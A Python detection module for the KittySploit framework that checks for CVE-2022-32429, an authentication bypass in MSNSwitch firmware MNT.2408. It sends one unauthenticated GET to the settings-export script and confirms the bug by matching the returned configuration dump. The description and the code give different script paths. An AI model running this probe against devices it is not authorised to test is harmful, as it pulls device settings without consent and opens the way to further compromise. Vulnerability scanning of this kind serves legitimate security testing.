#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""MSNSwitch Firmware MNT."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MSNSwitch Firmware MNT.2408 - Authentication Bypass Detection',
        'description': 'MSNSwitch Firmware MNT.2408 is susceptible to authentication bypass in the component http://MYDEVICEIP/cgi-bin-sdb/ExportSettings.sh. An attacker can arbitrarily configure settings, leading to possible remote code execution and subsequent unauthorized operations.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'config', 'dump', 'packetstorm', 'msmswitch', 'unauth', 'switch', 'megatech', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/169819/MSNSwitch-Firmware-MNT.2408-Remote-Code-Execution.html',
            'https://elifulkerson.com/CVE-2022-32429/',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-32429',
            'http://packetstormsecurity.com/files/169819/MSNSwitch-Firmware-MNT.2408-Remote-Code-Execution.html',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2022-32429',
    }

    def run(self):
        r = self.http_request(method="GET", path='/cgi-bin-hax/ExportSettings.sh', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('SSID1',)
        header_regexes = ('filename="Settings(.*).dat', 'application/octet-stream',)
        if (any(m in body for m in body_any)) and (any(re.search(rx, headers, 0) for rx in header_regexes)):
            self.set_info(
                severity='critical',
                reason="MSNSwitch Firmware MNT.2408 - Authentication Bypass detected",
                path='/cgi-bin-hax/ExportSettings.sh',
            )
            return True
        return False

